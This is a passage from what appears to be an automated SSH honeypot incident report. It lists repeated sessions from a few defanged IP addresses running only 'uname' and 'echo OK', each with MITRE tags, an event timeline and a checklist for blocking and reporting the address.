| `2026-06-27 10:18:02` | `cowrie.command.input` |
| `2026-06-27 10:18:03` | `cowrie.log.closed` |
| `2026-06-27 10:18:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-628d557ef6fc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:17 |
| **Last Seen** | 2026-06-27 10:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:17:56` | `cowrie.session.connect` |
| `2026-06-27 10:17:56` | `cowrie.client.version` |
| `2026-06-27 10:17:56` | `cowrie.client.kex` |
| `2026-06-27 10:17:56` | `cowrie.login.success` |
| `2026-06-27 10:17:57` | `cowrie.session.params` |
| `2026-06-27 10:17:57` | `cowrie.command.input` |
| `2026-06-27 10:17:57` | `cowrie.log.closed` |
| `2026-06-27 10:17:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc01813e547d

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 10:18 |
| **Last Seen** | 2026-06-27 10:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:18:25` | `cowrie.session.connect` |
| `2026-06-27 10:18:26` | `cowrie.client.version` |
| `2026-06-27 10:18:26` | `cowrie.client.kex` |
| `2026-06-27 10:18:27` | `cowrie.login.success` |
| `2026-06-27 10:18:29` | `cowrie.session.params` |
| `2026-06-27 10:18:29` | `cowrie.command.input` |
| `2026-06-27 10:18:29` | `cowrie.log.closed` |
| `2026-06-27 10:18:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eca17235a2c2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:18 |
| **Last Seen** | 2026-06-27 10:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:18:43` | `cowrie.session.connect` |
| `2026-06-27 10:18:43` | `cowrie.client.version` |
| `2026-06-27 10:18:43` | `cowrie.client.kex` |
| `2026-06-27 10:18:44` | `cowrie.login.success` |
| `2026-06-27 10:18:45` | `cowrie.session.params` |
| `2026-06-27 10:18:45` | `cowrie.command.input` |
| `2026-06-27 10:18:45` | `cowrie.log.closed` |
| `2026-06-27 10:18:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be0f132be15a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:19 |
| **Last Seen** | 2026-06-27 10:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:19:35` | `cowrie.session.connect` |
| `2026-06-27 10:19:35` | `cowrie.client.version` |
| `2026-06-27 10:19:35` | `cowrie.client.kex` |
| `2026-06-27 10:19:36` | `cowrie.login.success` |
| `2026-06-27 10:19:36` | `cowrie.session.params` |
| `2026-06-27 10:19:36` | `cowrie.command.input` |
| `2026-06-27 10:19:36` | `cowrie.log.closed` |
| `2026-06-27 10:19:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21566c97e74b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:20 |
| **Last Seen** | 2026-06-27 10:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:20:27` | `cowrie.session.connect` |
| `2026-06-27 10:20:27` | `cowrie.client.version` |
| `2026-06-27 10:20:27` | `cowrie.client.kex` |
| `2026-06-27 10:20:28` | `cowrie.login.success` |
| `2026-06-27 10:20:29` | `cowrie.session.params` |
| `2026-06-27 10:20:29` | `cowrie.command.input` |
| `2026-06-27 10:20:29` | `cowrie.log.closed` |
| `2026-06-27 10:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f50137d93c22

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:21 |
| **Last Seen** | 2026-06-27 10:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:21:17` | `cowrie.session.connect` |
| `2026-06-27 10:21:17` | `cowrie.client.version` |
| `2026-06-27 10:21:17` | `cowrie.client.kex` |
| `2026-06-27 10:21:18` | `cowrie.login.success` |
| `2026-06-27 10:21:18` | `cowrie.session.params` |
| `2026-06-27 10:21:18` | `cowrie.command.input` |
| `2026-06-27 10:21:19` | `cowrie.log.closed` |
| `2026-06-27 10:21:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c609d5bf76e5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:22 |
| **Last Seen** | 2026-06-27 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:22:06` | `cowrie.session.connect` |
| `2026-06-27 10:22:06` | `cowrie.client.version` |
| `2026-06-27 10:22:06` | `cowrie.client.kex` |
| `2026-06-27 10:22:07` | `cowrie.login.success` |
| `2026-06-27 10:22:07` | `cowrie.session.params` |
| `2026-06-27 10:22:07` | `cowrie.command.input` |
| `2026-06-27 10:22:07` | `cowrie.log.closed` |
| `2026-06-27 10:22:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-633cd3bb8a96

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:22 |
| **Last Seen** | 2026-06-27 10:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:22:54` | `cowrie.session.connect` |
| `2026-06-27 10:22:54` | `cowrie.client.version` |
| `2026-06-27 10:22:54` | `cowrie.client.kex` |
| `2026-06-27 10:22:55` | `cowrie.login.success` |
| `2026-06-27 10:22:56` | `cowrie.session.params` |
| `2026-06-27 10:22:56` | `cowrie.command.input` |
| `2026-06-27 10:22:56` | `cowrie.log.closed` |
| `2026-06-27 10:22:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95857c662810

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:23 |
| **Last Seen** | 2026-06-27 10:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:23:42` | `cowrie.session.connect` |
| `2026-06-27 10:23:42` | `cowrie.client.version` |
| `2026-06-27 10:23:42` | `cowrie.client.kex` |
| `2026-06-27 10:23:43` | `cowrie.login.success` |
| `2026-06-27 10:23:43` | `cowrie.session.params` |
| `2026-06-27 10:23:43` | `cowrie.command.input` |
| `2026-06-27 10:23:43` | `cowrie.log.closed` |
| `2026-06-27 10:23:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e05c08b31571

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:24 |
| **Last Seen** | 2026-06-27 10:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:24:30` | `cowrie.session.connect` |
| `2026-06-27 10:24:30` | `cowrie.client.version` |
| `2026-06-27 10:24:30` | `cowrie.client.kex` |
| `2026-06-27 10:24:30` | `cowrie.login.success` |
| `2026-06-27 10:24:32` | `cowrie.session.params` |
| `2026-06-27 10:24:32` | `cowrie.command.input` |
| `2026-06-27 10:24:32` | `cowrie.log.closed` |
| `2026-06-27 10:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e89a5423ed

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:25 |
| **Last Seen** | 2026-06-27 10:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:25:19` | `cowrie.session.connect` |
| `2026-06-27 10:25:19` | `cowrie.client.version` |
| `2026-06-27 10:25:19` | `cowrie.client.kex` |
| `2026-06-27 10:25:19` | `cowrie.login.success` |
| `2026-06-27 10:25:20` | `cowrie.session.params` |
| `2026-06-27 10:25:20` | `cowrie.command.input` |
| `2026-06-27 10:25:20` | `cowrie.log.closed` |
| `2026-06-27 10:25:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6516c1aa8f78

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:26 |
| **Last Seen** | 2026-06-27 10:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:26:08` | `cowrie.session.connect` |
| `2026-06-27 10:26:08` | `cowrie.client.version` |
| `2026-06-27 10:26:08` | `cowrie.client.kex` |
| `2026-06-27 10:26:08` | `cowrie.login.success` |
| `2026-06-27 10:26:09` | `cowrie.session.params` |
| `2026-06-27 10:26:09` | `cowrie.command.input` |
| `2026-06-27 10:26:09` | `cowrie.log.closed` |
| `2026-06-27 10:26:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac03f6fe5f97

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:26 |
| **Last Seen** | 2026-06-27 10:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:26:58` | `cowrie.session.connect` |
| `2026-06-27 10:26:58` | `cowrie.client.version` |
| `2026-06-27 10:26:58` | `cowrie.client.kex` |
| `2026-06-27 10:26:58` | `cowrie.login.success` |
| `2026-06-27 10:26:59` | `cowrie.session.params` |
| `2026-06-27 10:26:59` | `cowrie.command.input` |
| `2026-06-27 10:26:59` | `cowrie.log.closed` |
| `2026-06-27 10:26:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a03a04da381

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:27 |
| **Last Seen** | 2026-06-27 10:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:27:49` | `cowrie.session.connect` |
| `2026-06-27 10:27:49` | `cowrie.client.version` |
| `2026-06-27 10:27:49` | `cowrie.client.kex` |
| `2026-06-27 10:27:49` | `cowrie.login.success` |
| `2026-06-27 10:27:50` | `cowrie.session.params` |
| `2026-06-27 10:27:50` | `cowrie.command.input` |
| `2026-06-27 10:27:50` | `cowrie.log.closed` |
| `2026-06-27 10:27:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07f5da01295e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 10:28 |
| **Last Seen** | 2026-06-27 10:28 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:28:37` | `cowrie.session.connect` |
| `2026-06-27 10:28:38` | `cowrie.client.version` |
| `2026-06-27 10:28:38` | `cowrie.client.kex` |
| `2026-06-27 10:28:43` | `cowrie.login.success` |
| `2026-06-27 10:28:46` | `cowrie.session.params` |
| `2026-06-27 10:28:46` | `cowrie.command.input` |
| `2026-06-27 10:28:48` | `cowrie.log.closed` |
| `2026-06-27 10:28:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2430a17a8c48

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:28 |
| **Last Seen** | 2026-06-27 10:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:28:40` | `cowrie.session.connect` |
| `2026-06-27 10:28:40` | `cowrie.client.version` |
| `2026-06-27 10:28:40` | `cowrie.client.kex` |
| `2026-06-27 10:28:40` | `cowrie.login.success` |
| `2026-06-27 10:28:41` | `cowrie.session.params` |
| `2026-06-27 10:28:41` | `cowrie.command.input` |
| `2026-06-27 10:28:41` | `cowrie.log.closed` |
| `2026-06-27 10:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a1d68778e99

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:29 |
| **Last Seen** | 2026-06-27 10:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:29:29` | `cowrie.session.connect` |
| `2026-06-27 10:29:29` | `cowrie.client.version` |
| `2026-06-27 10:29:29` | `cowrie.client.kex` |
| `2026-06-27 10:29:29` | `cowrie.login.success` |
| `2026-06-27 10:29:30` | `cowrie.session.params` |
| `2026-06-27 10:29:30` | `cowrie.command.input` |
| `2026-06-27 10:29:30` | `cowrie.log.closed` |
| `2026-06-27 10:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e327743c751

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:30 |
| **Last Seen** | 2026-06-27 10:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:30:18` | `cowrie.session.connect` |
| `2026-06-27 10:30:18` | `cowrie.client.version` |
| `2026-06-27 10:30:19` | `cowrie.client.kex` |
| `2026-06-27 10:30:19` | `cowrie.login.success` |
| `2026-06-27 10:30:20` | `cowrie.session.params` |
| `2026-06-27 10:30:20` | `cowrie.command.input` |
| `2026-06-27 10:30:20` | `cowrie.log.closed` |
| `2026-06-27 10:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50e715e0ef7f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:31 |
| **Last Seen** | 2026-06-27 10:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:31:11` | `cowrie.session.connect` |
| `2026-06-27 10:31:11` | `cowrie.client.version` |
| `2026-06-27 10:31:11` | `cowrie.client.kex` |
| `2026-06-27 10:31:12` | `cowrie.login.success` |
| `2026-06-27 10:31:12` | `cowrie.session.params` |
| `2026-06-27 10:31:12` | `cowrie.command.input` |
| `2026-06-27 10:31:13` | `cowrie.log.closed` |
| `2026-06-27 10:31:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf3a3c918a3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:32 |
| **Last Seen** | 2026-06-27 10:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:32:17` | `cowrie.session.connect` |
| `2026-06-27 10:32:17` | `cowrie.client.version` |
| `2026-06-27 10:32:18` | `cowrie.client.kex` |
| `2026-06-27 10:32:18` | `cowrie.login.success` |
| `2026-06-27 10:32:19` | `cowrie.session.params` |
| `2026-06-27 10:32:19` | `cowrie.command.input` |
| `2026-06-27 10:32:19` | `cowrie.log.closed` |
| `2026-06-27 10:32:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3fd0448c5da

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 10:32 |
| **Last Seen** | 2026-06-27 10:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:32:46` | `cowrie.session.connect` |
| `2026-06-27 10:32:46` | `cowrie.client.version` |
| `2026-06-27 10:32:46` | `cowrie.client.kex` |
| `2026-06-27 10:32:48` | `cowrie.login.success` |
| `2026-06-27 10:32:49` | `cowrie.session.params` |
| `2026-06-27 10:32:49` | `cowrie.command.input` |
| `2026-06-27 10:32:50` | `cowrie.log.closed` |
| `2026-06-27 10:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aebf8c562daa

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:33 |
| **Last Seen** | 2026-06-27 10:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:33:11` | `cowrie.session.connect` |
| `2026-06-27 10:33:11` | `cowrie.client.version` |
| `2026-06-27 10:33:11` | `cowrie.client.kex` |
| `2026-06-27 10:33:11` | `cowrie.login.success` |
| `2026-06-27 10:33:12` | `cowrie.session.params` |
| `2026-06-27 10:33:12` | `cowrie.command.input` |
| `2026-06-27 10:33:12` | `cowrie.log.closed` |
| `2026-06-27 10:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c00d158170b5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:34 |
| **Last Seen** | 2026-06-27 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:34:01` | `cowrie.session.connect` |
| `2026-06-27 10:34:01` | `cowrie.client.version` |
| `2026-06-27 10:34:01` | `cowrie.client.kex` |
| `2026-06-27 10:34:01` | `cowrie.login.success` |
| `2026-06-27 10:34:02` | `cowrie.session.params` |
| `2026-06-27 10:34:02` | `cowrie.command.input` |
| `2026-06-27 10:34:02` | `cowrie.log.closed` |
| `2026-06-27 10:34:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01ac363c36a6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:34 |
| **Last Seen** | 2026-06-27 10:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:34:52` | `cowrie.session.connect` |
| `2026-06-27 10:34:52` | `cowrie.client.version` |
| `2026-06-27 10:34:52` | `cowrie.client.kex` |
| `2026-06-27 10:34:53` | `cowrie.login.success` |
| `2026-06-27 10:34:54` | `cowrie.session.params` |
| `2026-06-27 10:34:54` | `cowrie.command.input` |
| `2026-06-27 10:34:54` | `cowrie.log.closed` |
| `2026-06-27 10:34:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe80716de9da

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:35 |
| **Last Seen** | 2026-06-27 10:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 10:35:45` | `cowrie.session.connect` |
| `2026-06-27 10:35:45` | `cowrie.client.version` |
| `2026-06-27 10:35:45` | `cowrie.client.kex` |
| `2026-06-27 10:35:45` | `cowrie.login.success` |
| `2026-06-27 10:35:46` | `cowrie.session.params` |
| `2026-06-27 10:35:46` | `cowrie.command.input` |
| `2026-06-27 10:35:46` | `cowrie.log.closed` |
| `2026-06-27 10:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c4443b7ee0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 10:36 |
| **Last Seen** | 2026-06-27 10:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

